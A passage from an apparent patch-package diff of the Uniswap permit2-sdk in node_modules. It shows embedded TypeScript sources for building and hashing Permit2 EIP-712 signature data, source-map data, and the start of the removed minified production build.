!Array.isArray(permit.details)\n}\n\nexport abstract class AllowanceTransfer {\n  /**\n   * Cannot be constructed.\n   */\n  private constructor() {}\n\n  // return the data to be sent in a eth_signTypedData RPC call\n  // for signing the given permit data\n  public static getPermitData(\n    permit: PermitSingle | PermitBatch,\n    permit2Address: string,\n    chainId: number\n  ): PermitSingleData | PermitBatchData {\n    invariant(MaxSigDeadline.gte(permit.sigDeadline), 'SIG_DEADLINE_OUT_OF_RANGE')\n\n    const domain = permit2Domain(permit2Address, chainId)\n    if (isPermit(permit)) {\n      validatePermitDetails(permit.details)\n      return {\n        domain,\n        types: PERMIT_TYPES,\n        values: permit,\n      }\n    } else {\n      permit.details.forEach(validatePermitDetails)\n      return {\n        domain,\n        types: PERMIT_BATCH_TYPES,\n        values: permit,\n      }\n    }\n  }\n\n  public static hash(permit: PermitSingle | PermitBatch, permit2Address: string, chainId: number): string {\n    const { domain, types, values } = AllowanceTransfer.getPermitData(permit, permit2Address, chainId)\n    return _TypedDataEncoder.hash(domain, types, values)\n  }\n}\n\nfunction validatePermitDetails(details: PermitDetails) {\n  invariant(MaxOrderedNonce.gte(details.nonce), 'NONCE_OUT_OF_RANGE')\n  invariant(MaxAllowanceTransferAmount.gte(details.amount), 'AMOUNT_OUT_OF_RANGE')\n  invariant(MaxAllowanceExpiration.gte(details.expiration), 'EXPIRATION_OUT_OF_RANGE')\n}\n","import invariant from 'tiny-invariant'\nimport { TypedDataDomain, TypedDataField } from '@ethersproject/abstract-signer'\nimport { BigNumberish } from '@ethersproject/bignumber'\nimport { _TypedDataEncoder } from '@ethersproject/hash'\nimport { permit2Domain } from './domain'\nimport { MaxSigDeadline, MaxUnorderedNonce, MaxSignatureTransferAmount } from './constants'\n\nexport interface Witness {\n  witness: any\n  witnessTypeName: string\n  witnessType: Record<string, TypedDataField[]>\n}\n\nexport interface TokenPermissions {\n  token: string\n  amount: BigNumberish\n}\n\nexport interface PermitTransferFrom {\n  permitted: TokenPermissions\n  spender: string\n  nonce: BigNumberish\n  deadline: BigNumberish\n}\n\nexport interface PermitBatchTransferFrom {\n  permitted: TokenPermissions[]\n  spender: string\n  nonce: BigNumberish\n  deadline: BigNumberish\n}\n\nexport type PermitTransferFromData = {\n  domain: TypedDataDomain\n  types: Record<string, TypedDataField[]>\n  values: PermitTransferFrom\n}\n\nexport type PermitBatchTransferFromData = {\n  domain: TypedDataDomain\n  types: Record<string, TypedDataField[]>\n  values: PermitBatchTransferFrom\n}\n\nconst TOKEN_PERMISSIONS = [\n  { name: 'token', type: 'address' },\n  { name: 'amount', type: 'uint256' },\n]\n\nconst PERMIT_TRANSFER_FROM_TYPES = {\n  PermitTransferFrom: [\n    { name: 'permitted', type: 'TokenPermissions' },\n    { name: 'spender', type: 'address' },\n    { name: 'nonce', type: 'uint256' },\n    { name: 'deadline', type: 'uint256' },\n  ],\n  TokenPermissions: TOKEN_PERMISSIONS,\n}\n\nconst PERMIT_BATCH_TRANSFER_FROM_TYPES = {\n  PermitBatchTransferFrom: [\n    { name: 'permitted', type: 'TokenPermissions[]' },\n    { name: 'spender', type: 'address' },\n    { name: 'nonce', type: 'uint256' },\n    { name: 'deadline', type: 'uint256' },\n  ],\n  TokenPermissions: TOKEN_PERMISSIONS,\n}\n\nfunction permitTransferFromWithWitnessType(witness: Witness): Record<string, TypedDataField[]> {\n  return {\n    PermitWitnessTransferFrom: [\n      { name: 'permitted', type: 'TokenPermissions' },\n      { name: 'spender', type: 'address' },\n      { name: 'nonce', type: 'uint256' },\n      { name: 'deadline', type: 'uint256' },\n      { name: 'witness', type: witness.witnessTypeName },\n    ],\n    TokenPermissions: TOKEN_PERMISSIONS,\n    ...witness.witnessType,\n  }\n}\n\nfunction permitBatchTransferFromWithWitnessType(witness: Witness): Record<string, TypedDataField[]> {\n  return {\n    PermitBatchWitnessTransferFrom: [\n      { name: 'permitted', type: 'TokenPermissions[]' },\n      { name: 'spender', type: 'address' },\n      { name: 'nonce', type: 'uint256' },\n      { name: 'deadline', type: 'uint256' },\n      { name: 'witness', type: witness.witnessTypeName },\n    ],\n    TokenPermissions: TOKEN_PERMISSIONS,\n    ...witness.witnessType,\n  }\n}\n\nfunction isPermitTransferFrom(permit: PermitTransferFrom | PermitBatchTransferFrom): permit is PermitTransferFrom {\n  return !Array.isArray(permit.permitted)\n}\n\nexport abstract class SignatureTransfer {\n  /**\n   * Cannot be constructed.\n   */\n  private constructor() {}\n\n  // return the data to be sent in a eth_signTypedData RPC call\n  // for signing the given permit data\n  public static getPermitData(\n    permit: PermitTransferFrom | PermitBatchTransferFrom,\n    permit2Address: string,\n    chainId: number,\n    witness?: Witness\n  ): PermitTransferFromData | PermitBatchTransferFromData {\n    invariant(MaxSigDeadline.gte(permit.deadline), 'SIG_DEADLINE_OUT_OF_RANGE')\n    invariant(MaxUnorderedNonce.gte(permit.nonce), 'NONCE_OUT_OF_RANGE')\n\n    const domain = permit2Domain(permit2Address, chainId)\n    if (isPermitTransferFrom(permit)) {\n      validateTokenPermissions(permit.permitted)\n      const types = witness ? permitTransferFromWithWitnessType(witness) : PERMIT_TRANSFER_FROM_TYPES\n      const values = witness ? Object.assign(permit, { witness: witness.witness }) : permit\n      return {\n        domain,\n        types,\n        values,\n      }\n    } else {\n      permit.permitted.forEach(validateTokenPermissions)\n      const types = witness ? permitBatchTransferFromWithWitnessType(witness) : PERMIT_BATCH_TRANSFER_FROM_TYPES\n      const values = witness ? Object.assign(permit, { witness: witness.witness }) : permit\n      return {\n        domain,\n        types,\n        values,\n      }\n    }\n  }\n\n  public static hash(\n    permit: PermitTransferFrom | PermitBatchTransferFrom,\n    permit2Address: string,\n    chainId: number,\n    witness?: Witness\n  ): string {\n    const { domain, types, values } = SignatureTransfer.getPermitData(permit, permit2Address, chainId, witness)\n    return _TypedDataEncoder.hash(domain, types, values)\n  }\n}\n\nfunction validateTokenPermissions(permissions: TokenPermissions) {\n  invariant(MaxSignatureTransferAmount.gte(permissions.amount), 'AMOUNT_OUT_OF_RANGE')\n}\n","import { BigNumber } from '@ethersproject/bignumber'\nimport { Provider } from '@ethersproject/providers'\nimport Permit2Abi from '../../abis/Permit2.json'\nimport { Contract } from '@ethersproject/contracts'\n\nexport interface AllowanceData {\n  amount: BigNumber\n  nonce: number\n  expiration: number\n}\n\nexport class AllowanceProvider {\n  private permit2: Contract\n\n  constructor(private provider: Provider, private permit2Address: string) {\n    this.permit2 = new Contract(this.permit2Address, Permit2Abi, this.provider)\n  }\n\n  async getAllowanceData(token: string, owner: string, spender: string): Promise<AllowanceData> {\n    return await this.permit2.allowance(owner, token, spender)\n  }\n\n  async getAllowance(token: string, owner: string, spender: string): Promise<BigNumber> {\n    return (await this.getAllowanceData(token, owner, spender)).amount\n  }\n\n  async getNonce(token: string, owner: string, spender: string): Promise<number> {\n    return (await this.getAllowanceData(token, owner, spender)).nonce\n  }\n\n  async getExpiration(token: string, owner: string, spender: string): Promise<number> {\n    return (await this.getAllowanceData(token, owner, spender)).expiration\n  }\n}\n"],"names":["PERMIT2_ADDRESS","MaxUint48","BigNumber","from","MaxUint160","MaxUint256","MaxAllowanceTransferAmount","MaxAllowanceExpiration","MaxOrderedNonce","MaxSignatureTransferAmount","MaxUnorderedNonce","MaxSigDeadline","InstantExpiration","PERMIT2_DOMAIN_NAME","permit2Domain","permit2Address","chainId","name","verifyingContract","PERMIT_DETAILS","type","PERMIT_TYPES","PermitSingle","PermitDetails","PERMIT_BATCH_TYPES","PermitBatch","isPermit","permit","Array","isArray","details","AllowanceTransfer","getPermitData","gte","sigDeadline","invariant","domain","validatePermitDetails","types","values","forEach","hash","_TypedDataEncoder","nonce","amount","expiration","TOKEN_PERMISSIONS","PERMIT_TRANSFER_FROM_TYPES","PermitTransferFrom","TokenPermissions","PERMIT_BATCH_TRANSFER_FROM_TYPES","PermitBatchTransferFrom","permitTransferFromWithWitnessType","witness","PermitWitnessTransferFrom","witnessTypeName","witnessType","permitBatchTransferFromWithWitnessType","PermitBatchWitnessTransferFrom","isPermitTransferFrom","permitted","SignatureTransfer","deadline","validateTokenPermissions","Object","assign","permissions","AllowanceProvider","provider","permit2","Contract","Permit2Abi","getAllowanceData","token","owner","spender","allowance","getAllowance","getNonce","getExpiration"],"mappings":"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"}
\ No newline at end of file
diff --git a/node_modules/@uniswap/permit2-sdk/dist/permit2-sdk.cjs.production.min.js b/node_modules/@uniswap/permit2-sdk/dist/permit2-sdk.cjs.production.min.js
index 4cac2a4..4438f8a 100644
--- a/node_modules/@uniswap/permit2-sdk/dist/permit2-sdk.cjs.production.min.js
+++ b/node_modules/@uniswap/permit2-sdk/dist/permit2-sdk.cjs.production.min.js
@@ -1,2 +1,2 @@
-"use strict";Object.defineProperty(exports,"__esModule",{value:!0});var e,t=(e=require("tiny-invariant"))&&"object"==typeof e&&"default"in e?e.default:e,n=require("@ethersproject/hash"),r=require("@ethersproject/bignumber"),a=require("@ethersproject/contracts"),i=r.BigNumber.from("0xffffffffffff"),s=r.BigNumber.from("0xffffffffffffffffffffffffffffffffffffffff"),o=r.BigNumber.from("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"),p=s,u=i,y=i,d=o,l=o,m=o,c=r.BigNumber.from(0);function f(e,t){return{name:"Permit2",chainId:t,verifyingContract:e}}var h=[{name:"token",type:"address"},{name:"amount",type:"uint160"},{name:"expiration",type:"uint48"},{name:"nonce",type:"uint48"}],T={PermitSingle:[{name:"details",type:"PermitDetails"},{name:"spender",type:"address"},{name:"sigDeadline",type:"uint256"}],PermitDetails:h},v={PermitBatch:[{name:"details",type:"PermitDetails[]"},{name:"spender",type:"address"},{name:"sigDeadline",type:"uint256"}],PermitDetails:h},g=function(){function e(){}return e.getPermitData=function(e,n,r){m.gte(e.sigDeadline)||t(!1);var a=f(n,r);return function(e){return!Array.isArray(e.details)}(e)?(w(e.details),{domain:a,types:T,values:e}):(e.details.forEach(w),{domain:a,types:v,values:e})},e.hash=function(t,r,a){var i=e.getPermitData(t,r,a);return n._TypedDataEncoder.hash(i.domain,i.types,i.values)},e}();function w(e){y.gte(e.nonce)||t(!1),p.gte(e.amount)||t(!1),u.gte(e.expiration)||t(!1)}function x(){x=function(){return e};var e={},t=Object.prototype,n=t.hasOwnProperty,r="function"==typeof Symbol?Symbol:{},a=r.iterator||"@@iterator",i=r.asyncIterator||"@@asyncIterator",s=r.toStringTag||"@@toStringTag";function o(e,t,n){return Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}),e[t]}try{o({},"")}catch(e){o=function(e,t,n){return e[t]=n}}function p(e,t,n,r){var a=Object.create((t&&t.prototype instanceof d?t:d).prototype),i=new k(r||[]);return a._invoke=function(e,t,n){var r="suspendedStart";return function(a,i){if("executing"===r)throw new Error("Generator is already running");if("completed"===r){if("throw"===a)throw i;return{value:void 0,done:!0}}for(n.method=a,n.arg=i;;){var s=n.delegate;if(s){var o=w(s,n);if(o){if(o===y)continue;return o}}if("next"===n.method)n.sent=n._sent=n.arg;else if("throw"===n.method){if("suspendedStart"===r)throw r="completed",n.arg;n.dispatchException(n.arg)}else"return"===n.method&&n.abrupt("return",n.arg);r="executing";var p=u(e,t,n);if("normal"===p.type){if(r=n.done?"completed":"suspendedYield",p.arg===y)continue;return{value:p.arg,done:n.done}}"throw"===p.type&&(r="completed",n.method="throw",n.arg=p.arg)}}}(e,n,i),a}function u(e,t,n){try{return{type:"normal",arg:e.call(t,n)}}catch(e){return{type:"throw",arg:e}}}e.wrap=p;var y={};function d(){}function l(){}function m(){}var c={};o(c,a,(function(){return this}));var f=Object.getPrototypeOf,h=f&&f(f(A([])));h&&h!==t&&n.call(h,a)&&(c=h);var T=m.prototype=d.prototype=Object.create(c);function v(e){["next","throw","return"].forEach((function(t){o(e,t,(function(e){return this._invoke(t,e)}))}))}function g(e,t){var r;this._invoke=function(a,i){function s(){return new t((function(r,s){!function r(a,i,s,o){var p=u(e[a],e,i);if("throw"!==p.type){var y=p.arg,d=y.value;return d&&"object"==typeof d&&n.call(d,"__await")?t.resolve(d.__await).then((function(e){r("next",e,s,o)}),(function(e){r("throw",e,s,o)})):t.resolve(d).then((function(e){y.value=e,s(y)}),(function(e){return r("throw",e,s,o)}))}o(p.arg)}(a,i,r,s)}))}return r=r?r.then(s,s):s()}}function w(e,t){var n=e.iterator[t.method];if(void 0===n){if(t.delegate=null,"throw"===t.method){if(e.iterator.return&&(t.method="return",t.arg=void 0,w(e,t),"throw"===t.method))return y;t.method="throw",t.arg=new TypeError("The iterator does not provide a 'throw' method")}return y}var r=u(n,e.iterator,t.arg);if("throw"===r.type)return t.method="throw",t.arg=r.arg,t.delegate=null,y;var a=r.arg;return a?a.done?(t[e.resultName]=a.value,t.next=e.nextLoc,"return"!==t.method&&(t.method="next",t.arg=void 0),t.delegate=null,y):a:(t.method="throw",t.arg=new TypeError("iterator result is not an object"),t.delegate=null,y)}function b(e){var t={tryLoc:e[0]};1 in e&&(t.catchLoc=e[1]),2 in e&&(t.finallyLoc=e[2],t.afterLoc=e[3]),this.tryEntries.push(t)}function P(e){var t=e.completion||{};t.type="normal",delete t.arg,e.completion=t}function k(e){this.tryEntries=[{tryLoc:"root"}],e.forEach(b,this),this.reset(!0)}function A(e){if(e){var t=e[a];if(t)return t.call(e);if("function"==typeof e.next)return e;if(!isNaN(e.length)){var r=-1,i=function t(){for(;++r<e.length;)if(n.call(e,r))return t.value=e[r],t.done=!1,t;return t.value=void 0,t.done=!0,t};return i.next=i}}return{next:E}}function E(){return{value:void 0,done:!0}}return l.prototype=m,o(T,"constructor",m),o(m,"constructor",l),l.displayName=o(m,s,"GeneratorFunction"),e.isGeneratorFunction=function(e){var t="function"==typeof e&&e.constructor;return!!t&&(t===l||"GeneratorFunction"===(t.displayName||t.name))},e.mark=function(e){return Object.setPrototypeOf?Object.setPrototypeOf(e,m):(e.__proto__=m,o(e,s,"GeneratorFunction")),e.prototype=Object.create(T),e},e.awrap=function(e){return{__await:e}},v(g.prototype),o(g.prototype,i,(function(){return this})),e.AsyncIterator=g,e.async=function(t,n,r,a,i){void 0===i&&(i=Promise);var s=new g(p(t,n,r,a),i);return e.isGeneratorFunction(n)?s:s.next().then((function(e){return e.done?e.value:s.next()}))},v(T),o(T,s,"Generator"),o(T,a,(function(){return this})),o(T,"toString",(function(){return"[object Generator]"})),e.keys=function(e){var t=[];for(var n in e)t.push(n);return t.reverse(),function n(){for(;t.length;){var r=t.pop();if(r in e)return n.value=r,n.done=!1,n}return n.done=!0,n}},e.values=A,k.prototype={constructor:k,reset:function(e){if(this.prev=0,this.next=0,this.sent=this._sent=void 0,this.done=!1,this.delegate=null,this.method="next",this.arg=void 0,this.tryEntries.forEach(P),!e)for(var t in this)"t"===t.charAt(0)&&n.call(this,t)&&!isNaN(+t.slice(1))&&(this[t]=void 0)},stop:function(){this.done=!0;var e=this.tryEntries[0].completion;if("throw"===e.type)throw e.arg;return this.rval},dispatchException:function(e){if(this.done)throw e;var t=this;function r(n,r){return s.type="throw",s.arg=e,t.next=n,r&&(t.method="next",t.arg=void 0),!!r}for(var a=this.tryEntries.length-1;a>=0;--a){var i=this.tryEntries[a],s=i.completion;if("root"===i.tryLoc)return r("end");if(i.tryLoc<=this.prev){var o=n.call(i,"catchLoc"),p=n.call(i,"finallyLoc");if(o&&p){if(this.prev<i.catchLoc)return r(i.catchLoc,!0);if(this.prev<i.finallyLoc)return r(i.finallyLoc)}else if(o){if(this.prev<i.catchLoc)return r(i.catchLoc,!0)}else{if(!p)throw new Error("try statement without catch or finally");if(this.prev<i.finallyLoc)return r(i.finallyLoc)}}}},abrupt:function(e,t){for(var r=this.tryEntries.length-1;r>=0;--r){var a=this.tryEntries[r];if(a.tryLoc<=this.prev&&n.call(a,"finallyLoc")&&this.prev<a.finallyLoc){var i=a;break}}i&&("break"===e||"continue"===e)&&i.tryLoc<=t&&t<=i.finallyLoc&&(i=null);var s=i?i.completion:{};return s.type=e,s.arg=t,i?(this.method="next",this.next=i.finallyLoc,y):this.complete(s)},complete:function(e,t){if("throw"===e.type)throw e.arg;return"break"===e.type||"continue"===e.type?this.next=e.arg:"return"===e.type?(this.rval=this.arg=e.arg,this.method="return",this.next="end"):"normal"===e.type&&t&&(this.next=t),y},finish:function(e){for(var t=this.tryEntries.length-1;t>=0;--t){var n=this.tryEntries[t];if(n.finallyLoc===e)return this.complete(n.completion,n.afterLoc),P(n),y}},catch:function(e){for(var t=this.tryEntries.length-1;t>=0;--t){var n=this.tryEntries[t];if(n.tryLoc===e){var r=n.completion;if("throw"===r.type){var a=r.arg;P(n)}return a}}throw new Error("illegal catch attempt")},delegateYield:function(e,t,n){return this.delegate={iterator:A(e),resultName:t,nextLoc:n},"next"===this.method&&(this.arg=void 0),y}},e}function b(e,t,n,r,a,i,s){try{var 